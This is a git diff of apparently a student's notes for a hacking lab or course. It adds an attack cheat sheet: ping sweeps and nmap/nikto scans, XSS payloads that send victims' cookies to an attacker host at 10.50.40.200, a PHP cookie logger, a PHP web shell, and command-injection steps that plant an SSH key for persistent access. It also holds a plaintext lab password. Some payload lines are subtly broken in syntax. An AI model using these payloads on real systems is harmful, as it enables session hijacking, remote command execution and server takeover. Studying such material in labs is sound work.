@@ -4,7 +4,7 @@ student
 
 GREY HOST:10.50.40.200
 password: 6HUtNMMk9Bq2ALW
-KamiNight@021
+New password is the default password you revert to 
 
 
 
@@ -44,3 +44,95 @@ results = tree.xpath('//small[@class="author"]/text()')
  #####PRINTS IT OUT  #####
 print ('Results: ',results)
 -----------------------------------------------------------------------------------------------------------------------
+
+PING SWEEP
+for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
+
+ 
+NMAP SCANN
+nmap -Pn -T4 --min-rate 2324243245 10.50.37.95 -p22,80,8080,8888,2222,4444
+nmap -Pn -T4 --min-rate 2324243245 10.50.37.95 -p22,80 --script=http-enum.nse
+nmap -Pn -T4 --min-rate 2324243245 10.50.37.95 -p22,80 --script=banner.nse
+
+
+nikto -host 10.50.37.95               for random port -port+ <portnum>
+nmap --script http-enum.nse 10.50.37.95 -p 80
+
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------
+
+(FOR POST) <script>alert("VULN XSS")</script>
+
+(TO STEAL COOKIE"S )
+
+run this on your op to catch the cookie when it's  ran on the website and have it sent to your pc.
+python3 -m http.server
+
+<script>document.location="http://10.50.40.200:8000/"+document.cookie;</script>  
+
+<?php
+$cookie = $_GET["username"]
+$steal = $fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+fwrite($steal, $cookie . "\n");
+fclose($steal);
+?>
+
+
+<script>document.location=http://<serverip>/uploads/cookie_stealer.php?username="+document.cookie;</script>
+<script>document.location=http://<10.50.37.95>/uploads/cookie_stealer.php?username="+document.cookie;</script>
+
+
+
+
+
+
+(webshell.php)
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="send">
+</FORM>
+<pre>
+<?php
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }     
+?>
+</pre>
+</BODY></HTML>
+
+
+Command injection.
+ when running command inject use ;infront of the command.
+
+
+
+----------------------------------------------------------------------------
+OUR BOX, generate RSA KEYS:
+ ssh-keygen -t rsa -b 4096
+ 
+where, passphrase default
+
+!/.ssh/id_rsa.pub id_rsa
+
+
+
+------------------------------------
+BOX WITH COMAND INJECTION:
+;mkdir /var/www/.ssh
+;ls -la /var/www
+;echo "<paste the public key>" > /var/www/.ssh/authorized_keys
+;cat /var/www/.ssh/authorized_keys
+
+--------------------------
+FROM YOUR BOX
+ssh -i .ssh/id_rsa www-data@10.50.37.95 ( ip for the  box ) 
+
+
